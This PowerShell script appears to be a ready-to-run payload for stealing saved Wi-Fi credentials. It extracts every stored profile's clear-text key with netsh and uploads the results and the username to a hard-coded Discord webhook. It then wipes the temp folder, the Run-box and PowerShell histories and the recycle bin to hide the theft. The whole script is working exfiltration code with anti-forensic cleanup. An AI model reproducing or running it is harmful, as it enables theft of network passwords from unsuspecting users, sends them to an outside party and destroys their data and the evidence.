$wifiProfiles = (netsh wlan show profiles) | ForEach-Object {
    $name = $_ -replace '^\s+:\s+', ''
    $pass = (netsh wlan show profile name="$name" key=clear) -replace '.*:\s*'
    [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
} | Format-Table -AutoSize | Out-String

$wifiProfiles > $env:TEMP/--wifi-pass.txt

# Function to upload to Discord via Webhook
function Upload-Discord {
    $webhookUrl = "https://discord.com/api/webhooks/1033424331855896606/zEgLOsmzgLZ9iLazQ_Jc4zhcpVGIpiPe0smW5QFUyHK8waleDHt8OP8S_k24AD_GgTeW"

    Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ('{"username":"' + $env:username + '","content":""}' | ConvertTo-Json)

    curl.exe -F "file1=@$env:TEMP/--wifi-pass.txt" $webhookUrl
}

Upload-Discord

# Function to clean up sensitive information
function Clean-Exfil { 
    # empty temp folder
    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

    # delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

Clean-Exfil
Remove-Item "$env:TEMP/--wifi-pass.txt" -Force
